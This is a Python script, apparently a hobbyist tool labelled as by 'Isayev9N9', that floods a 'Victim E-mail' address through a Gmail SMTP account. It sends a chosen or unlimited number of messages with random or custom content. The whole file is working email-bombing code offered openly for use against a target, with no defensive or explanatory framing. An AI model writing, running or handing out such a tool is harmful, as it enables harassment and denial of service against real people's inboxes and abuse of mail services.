#!/usr/bin/python
import smtplib
import sys
import time
import lorem
from colorama import Fore, Style, deinit, init

init()
bodyCustom = ""
SubjectCustom = ""
smtp_server = 'smtp.gmail.com'
port = 587
comptage = 1
unlimited = False

# Add your password and email for send mails
passWd = ''
email = ''

print(
        Fore.LIGHTMAGENTA_EX + Style.NORMAL + "\n\ndP .d88888b   .d888888  dP    dP  88888888b dP     dP .d888b. 888888ba  .d888b. ")
print(
        Fore.LIGHTMAGENTA_EX + Style.NORMAL + "88 88.    '8 d8'    88  Y8.  .8P  88        88     88 Y8' `88 88    `8b Y8' `88 ")
print(
        Fore.LIGHTMAGENTA_EX + Style.NORMAL + "88 `Y88888b. 88aaaaa88a  Y8aa8P  a88aaaa    88    .8P `8bad88 88     88 `8bad88 ")
print(
        Fore.LIGHTMAGENTA_EX + Style.NORMAL + "88       `8b 88     88     88     88        88    d8'     `88 88     88     `88 ")
print(
        Fore.LIGHTMAGENTA_EX + Style.NORMAL + "88 d8'   .8P 88     88     88     88        88  .d8P  d.  .88 88     88 d.  .88 ")
print(
        Fore.LIGHTMAGENTA_EX + Style.NORMAL + "dP  Y88888P  88     88     dP     88888888P 888888'   `8888P  dP     dP `8888P  ")
print(
        Fore.LIGHTMAGENTA_EX + Style.NORMAL + "oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo")
print(Fore.LIGHTCYAN_EX + Style.NORMAL + 'By Isayev9N9')

to = input(Fore.WHITE + Style.NORMAL + '\n\nVictim E-mail :  ')
print('\nFor sent unlimited mail enter 0, CTRL+C for finish')
total = int(input('Number mail of send ?  '))
if total == 0:
    unlimited = True
    print(Fore.GREEN + Style.NORMAL + '\nUnlimited mail Active')

print(Fore.WHITE + Style.NORMAL +'\nFor custom body enter Y')
bodyOrNot = input('Custom ?  ')
if bodyOrNot == "Y":
    print(Fore.GREEN + Style.NORMAL + '\nCustom body is Active')
    bodyCustom = input(Fore.WHITE + Style.NORMAL +"\nYour body custom :")
else:
    print(Fore.GREEN + Style.NORMAL + '\nRandom body Active')

print(Fore.WHITE + Style.NORMAL +'\nFor custom subject enter Y')
SubjectOrNot = input('Custom ?  ')
if SubjectOrNot == "Y":
    print(Fore.GREEN + Style.NORMAL + '\nCustom subject is Active')
    SubjectCustom = input(Fore.WHITE + Style.NORMAL +"\nYour subject custom :")
else:
    print(Fore.GREEN + Style.NORMAL + '\nRandom subject Active')

comptage2 = 0
try:
    if unlimited == True:
        nbConnect = 1
        while unlimited == True:
            comptage2=comptage2+1
            subject = lorem.sentence()
            body = lorem.paragraph()
            if bodyCustom != "":
                body = str((0-comptage2)) + bodyCustom + str(comptage2)
            if SubjectCustom != "":
                subject = SubjectCustom + str(comptage2)
            server = smtplib.SMTP(smtp_server, port)
            server.ehlo()
            server.starttls()
            server.login(email, passWd)
            if comptage == nbConnect:
                print(Fore.YELLOW + Style.NORMAL + "\nConnected Account  -> " + email + "")
                nbConnect = nbConnect + 20
            msg = 'From: nothing \nSubject: ' + subject + '\n' + body
            server.sendmail(email, to, msg)
            print(Fore.LIGHTGREEN_EX + Style.NORMAL + "Mail sent " + str(
                comptage) + "          To  ------->  " + to)
            comptage = comptage + 1
            sys.stdout.flush()
    else:
        nbConnect = 1
        for i in range(1, total + 1):
            subject = lorem.sentence()
            body = lorem.paragraph()
            if bodyCustom != "":
                body = str((comptage2-i)) + bodyCustom + str(i)
            if SubjectCustom != "":
                subject = SubjectCustom + str(i)
            server = smtplib.SMTP(smtp_server, port)
            server.ehlo()
            server.starttls()
            server.login(email, passWd)
            if i == nbConnect:
                print(Fore.YELLOW + Style.NORMAL + "Connected Account  -> " + email + "")
                nbConnect = nbConnect + 20
            msg = 'From: nothing \nSubject: ' + subject + '\n' + body
            server.sendmail(email, to, msg)
            print(Fore.LIGHTGREEN_EX + Style.NORMAL + "Mail sent " + str(i) + "/" + str(
                total) + "        To  ------->  " + to)
            time.sleep(.2)
            sys.stdout.flush()
            if i == total:
                server.quit()
    print('\nDone !!!')
    deinit()
    sys.exit()
except KeyboardInterrupt:
    print(Fore.RED + Style.NORMAL + '[*] Canceled')
    deinit()
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print(Fore.RED + Style.NORMAL + '\n[*] Username or password incorrect.')
    deinit()
    sys.exit()